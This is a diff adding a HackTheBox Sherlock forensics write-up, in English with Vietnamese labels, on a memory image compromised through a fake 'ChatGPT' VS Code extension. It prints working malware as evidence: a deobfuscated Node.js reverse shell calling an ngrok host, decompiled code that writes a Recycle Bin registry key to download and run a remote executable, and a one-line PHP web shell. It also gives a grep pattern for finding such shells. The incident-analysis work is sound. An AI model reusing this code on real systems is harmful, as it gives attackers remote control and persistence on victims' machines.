@@ -1141,3 +1141,262 @@ In VirusTotal:
 ![image](https://hackmd.io/_uploads/B1vgERmozx.png)
 
 **Answer:** `18.192.12.126:8888`
+
+### XV. ReliableThreat:
+> - Link lab: https://app.hackthebox.com/sherlocks/ReliableThreat?tab=play_sherlock
+> - Đề bài:
+![image](https://hackmd.io/_uploads/r1S6cA7oMx.png)
+
+#### 1. What is the application that starts the suspicious chain of processes?
+Using Volatility 3 to check `pstree` and `pslist`:
+![image](https://hackmd.io/_uploads/B1cxs2iiMx.png)
+![image](https://hackmd.io/_uploads/HJ_8snoiGe.png)
+As we can see, process `Code.exe`, whose PID is `1612`, created a lot of child process. We have the two of suspicuois sequences: `Code.exe` $\rightarrow$ `cmd.exe` (PID `4196`) $\rightarrow$ `RuntimeBroker.exe` (PID `1224`) and `Code.exe` $\rightarrow$ `devsense.php.l` (PID `8332`).
+
+**Answer:** `Code.exe`
+
+#### 2. Provide the full path of the malicious file used to gain initial access.
+Check for `cmdline` plugin of these processes:
+![image](https://hackmd.io/_uploads/ry5iphoszx.png)
+In the last PID, its path refers to `extension`, so I will `grep` this keyword by using plugin `filescan` and `grep -i "\.vscode\\\\extensions"`:
+![image](https://hackmd.io/_uploads/Bk4NJ6ojGg.png)
+Filename of the last extension is `0xs1rx58d3v.chatgpt-b0t-0.0.1` instead of `chatgpt-bot` or something else. It can be another AI, and its name different from most of extensions in the output, so I think it is suspicious.
+
+**Answer:** `C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js`
+
+#### 3. What user input, when executed, will run the malicious code?
+Dump `C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js` via physicall address that we have found before by using `windows.dumpfiles --physaddr 0x850cd2e704f0`, then read its content:
+![image](https://hackmd.io/_uploads/S1ppWpioze.png)
+If the user types `help`, an obfuscated script will be executed.
+
+**Answer:** `help`
+
+#### 4. What are the hostname and port used to establish a reverse shell?
+Using [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/) to deobfuscate the above script and I get this:
+``` js
+const fs = require('fs');
+const net = require("net");
+const path = require("path");
+const os = require('os');
+const {
+  pid
+} = require("process");
+const lockFilePath = path.join(os.homedir(), '.' + pid + ".lock");
+if (!fs.existsSync(lockFilePath)) {
+  fs.writeFile(lockFilePath, '', _0x2452ba => {
+    if (_0x2452ba) {
+      console.error(_0x2452ba);
+    }
+  });
+  (function () {
+    const _0x3db126 = new net.Socket();
+    _0x3db126.connect(16587, "6.tcp.eu.ngrok.io");
+    _0x3db126.on("data", _0xd34d07 => {
+      const _0x45fcf2 = _0xd34d07.toString();
+      require("child_process").exec(_0x45fcf2, (_0x460220, _0x254585, _0x3aa38b) => {
+        if (_0x460220) {
+          _0x3db126.write(_0x3aa38b);
+        } else {
+          _0x3db126.write(_0x254585);
+        }
+      });
+    });
+    _0x3db126.on("close", () => {
+      console.log("closed");
+    });
+    return /a/;
+  })();
+}
+```
+The above script connect to `6.tcp.eu.ngrok.io` server at port `16587`, then it will drop a file whose name has the form like `<process PID>.lock`. But I cannot find this file via `filescan`.
+
+**Answer:** `6.tcp.eu.ngrok.io:16587`
+
+#### 5. What is the display name of the developer who created this malicious file?
+`0xS1rx58D3V` is the publisher, but not his display name, so I have to found more information of this . When looking for [required files for VSCode extension](https://code.visualstudio.com/api/get-started/extension-anatomy), I found this:
+![image](https://hackmd.io/_uploads/rJkk46jjMe.png)
+![image](https://hackmd.io/_uploads/Sy4wSTijMe.png)
+And the format of a sample extension. When try dumping `package.json`, I cannot find this file via `filescan`, so I tried some `grep`:
+![image](https://hackmd.io/_uploads/SyKTrasszl.png)
+![image](https://hackmd.io/_uploads/B1ZnIpjsMl.png)
+I have found the `publisherDisplayName`.
+
+**Answer:** `0xS1rx58.D3V`
+
+#### 6. What time was the malicious file released? (UTC).
+When searching for the publisher and his extension, I found nothing, but [History of Extensions Removed from VS Marketplace](https://github.com/microsoft/vsmarketplace/blob/main/RemovedPackages.md):
+![image](https://hackmd.io/_uploads/rkVww6soze.png)
+This extension has been removed from VSCode, however, I found that URL to a VSCode extension has the format like:
+![image](https://hackmd.io/_uploads/H1nAvTjjfl.png)
+```
+https://marketplace.visualstudio.com/items?itemName=<name_of_extension>
+```
+Trying searching for 
+`https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T` on the Google:
+![image](https://hackmd.io/_uploads/S1kO_Tisze.png)
+But we have [WaybackMachine](https://web.archive.org/web/20240729231959/https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T&ssr=false#overview):
+![image](https://hackmd.io/_uploads/r1qXhdqiMl.png)
+
+**Answer:** `2024-07-23 00:41:19`
+
+#### 7. Provide the SID for the user who has been compromised.
+The SID of user is contained in `C:\Users\User2\AppData\Roaming\Microsoft\Protect\`, so `grep` for the `Protect` keyword:
+![image](https://hackmd.io/_uploads/HyBVt6jifl.png)
+
+**Answer:** `S-1-5-21-1998887770-13753423-1649717590-1001`
+
+#### 8. Provide the full path of the suspicious executable being run during the infection chain.
+As the analysed chain in task 1:
+![image](https://hackmd.io/_uploads/H1K6DF9sfg.png)
+
+**Answer:** `C:\Users\Public\RuntimeBroker.exe`
+
+#### 9. The threat actor has modified the Windows registry to include a new entry. This change ensures that whenever a legitimate component runs, it triggers the malicious process, allowing the threat actor to maintain control of the system. Specify the name of the legitimate component.
+I dumped `RuntimeBroker.exe` and analysed it via DIE:
+![image](https://hackmd.io/_uploads/H1KLjt9iMg.png)
+Then using IDA to find something:
+``` code
+void start()
+{
+  int v0; // r10d
+  struct _LIST_ENTRY *i; // rdx
+  __int64 v2; // rcx
+  int v3; // r9d
+  struct _LIST_ENTRY *Flink; // rsi
+  int Flink_low; // eax
+  struct _LIST_ENTRY *v6; // rdx
+  char *v7; // rax
+  __int64 v8; // rax
+  char *v9; // rax
+  char *v10; // r8
+  __int64 v11; // rcx
+  int v12; // r9d
+  unsigned __int8 *v13; // rsi
+  int v14; // eax
+  char *v15; // [rsp-10h] [rbp-48h]
+  int v16; // [rsp-8h] [rbp-40h]
+  struct _LIST_ENTRY *v17; // [rsp+0h] [rbp-38h]
+
+  sub_1400040D6();
+  for ( i = NtCurrentPeb()->Ldr->InMemoryOrderModuleList.Flink; ; i = v17->Flink )
+  {
+    v2 = WORD1(i[4].Blink);
+    v3 = 0;
+    Flink = i[5].Flink;
+    do
+    {
+      Flink_low = LOBYTE(Flink->Flink);
+      Flink = (struct _LIST_ENTRY *)((char *)Flink + 1);
+      if ( (char)Flink_low >= 97 )
+        LOBYTE(Flink_low) = Flink_low - 32;
+      v3 = Flink_low + __ROR4__(v3, 13);
+      --v2;
+    }
+    while ( v2 );
+    v17 = i;
+    v16 = v3;
+    v6 = i[2].Flink;
+    v7 = (char *)v6 + HIDWORD(v6[3].Blink);
+    if ( *((_WORD *)v7 + 12) == 523 )
+    {
+      v8 = *((unsigned int *)v7 + 34);
+      if ( v8 )
+      {
+        v9 = (char *)v6 + v8;
+        v10 = (char *)v6 + *((unsigned int *)v9 + 8);
+        v11 = *((unsigned int *)v9 + 6);
+        v15 = v9;
+        while ( v11 )
+        {
+          v12 = 0;
+          --v11;
+          v13 = (unsigned __int8 *)v6 + *(unsigned int *)&v10[4 * v11];
+          do
+          {
+            v14 = *v13++;
+            v12 = v14 + __ROR4__(v12, 13);
+          }
+          while ( (_BYTE)v14 != BYTE1(v14) );
+          if ( v16 + v12 == v0 )
+          {
+            LOWORD(v11) = *(_WORD *)((char *)&v6->Flink + 2 * v11 + *((unsigned int *)v15 + 9));
+            __asm { jmp     rax }
+          }
+        }
+      }
+    }
+  }
+}
+```
+It is a ROT13 script, but there is nothing related to Registry Key-changing here. Using FTK Imager to check the `C:\Users\Public\` folder:
+![image](https://hackmd.io/_uploads/rkC87fsszl.png)
+There is a malicious `.exe`, try examining it in IDA:
+``` code
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  DWORD v3; // eax
+  HKEY v5; // [rsp+58h] [rbp-28h] BYREF
+  HKEY hKey; // [rsp+60h] [rbp-20h] BYREF
+  LSTATUS v7; // [rsp+6Ch] [rbp-14h]
+  char *Str; // [rsp+70h] [rbp-10h]
+  LPCSTR lpSubKey; // [rsp+78h] [rbp-8h]
+
+  _main();
+  hKey = 0;
+  v5 = 0;
+  lpSubKey = "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell";
+  Str = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Powershell.exe -ExecutionPolicy Bypass -Command \"(New-Object Ne"
+        "t.WebClient).DownloadFile('http://s1rx.xyz/tmp.exe', 'C:\\Windows\\Temp\\tmp.exe'); Start-Process 'C:\\Windows\\"
+        "Temp\\tmp.exe'\"";
+  v7 = RegOpenKeyExA(
+         HKEY_LOCAL_MACHINE,
+         "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell",
+         0,
+         0x20006u,
+         &hKey);
+  if ( !v7 )
+  {
+    v7 = RegCreateKeyExA(hKey, "open\\command", 0, 0, 0, 0xF003Fu, 0, &v5, 0);
+    if ( !v7 )
+    {
+      v3 = strlen(Str);
+      RegSetValueExA(v5, 0, 0, 1u, (const BYTE *)Str, v3);
+      RegCloseKey(v5);
+    }
+    RegCloseKey(hKey);
+  }
+  return 0;
+}
+```
+This script changes the key in `SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell`, it belongs to Recycle Bin:
+![image](https://hackmd.io/_uploads/r1CyUGoofx.png)
+
+**Answer:** `Recycle Bin`
+
+#### 10. Which MITRE technique corresponds to the previous action?
+I found this [MITRE](https://attack.mitre.org/techniques/T1546/015/):
+![image](https://hackmd.io/_uploads/BkeuOMiifx.png)
+
+**Answer:** `T1546.015`
+
+#### 11. The threat actor has identified the location for all projects and manipulated one of the project files. Could you provide details about the malicious code that was added by the threat actor?
+We know that the extension dropped something like `.php`, attackers always tend to obfuscate or use execute function instead of direct code-writing. There are some function used for RCE like `eval(`, `system(`, `shell_exec(`, `passthru(`, `exec(`, `assert(`, or encode functions like `base64_decode(`, `gzinflate(`, `str_rot13(`, or get the command via request, such as `$_POST`, `$_GET`, `$_REQUEST`, `$_COOKIE`, `$_SERVER['HTTP_USER_AGENT']`. Because we have the numbers character of this malicious code as a hint, so I will filter the partern matching to what we know.
+- Dump the `Object` folder:
+![image](https://hackmd.io/_uploads/BJJHaaosfl.png)
+- Filtering by available strings:
+    ``` terminal
+    grep -rnE '\$[^ ]+ +[^ ]+ +[^ ]+ +[^;]+;|\$_(POST|GET|REQUEST|COOKIE|SERVER)|\b(eval|system|shell_exec|passthru|exec|assert|base64_decode|gzinflate|str_rot13|file_get_contents|curl_exec|fopen)[[:space:]]*\(' .
+    ```
+    And I found this:
+    ![image](https://hackmd.io/_uploads/ByR10aioMx.png)
+    ![image](https://hackmd.io/_uploads/ryQW0ajsze.png)
+    Every requests to `Laravel` have to pass through `index.php` first. `$_GET` used to get data from URL, then assign the value of the URL parameter `s1` to the variable `$testc`. For example, if attacker accesss this:
+    ```
+    http://trangweb.com/index.php?s1=whoami
+    ```
+    Then the value of `$testc` is `whoami`, and it will be executed after that. This is RCE attack.
+
+**Answer:**
+``` php
+$testc = $_GET['s1']; echo `$testc`;
+```
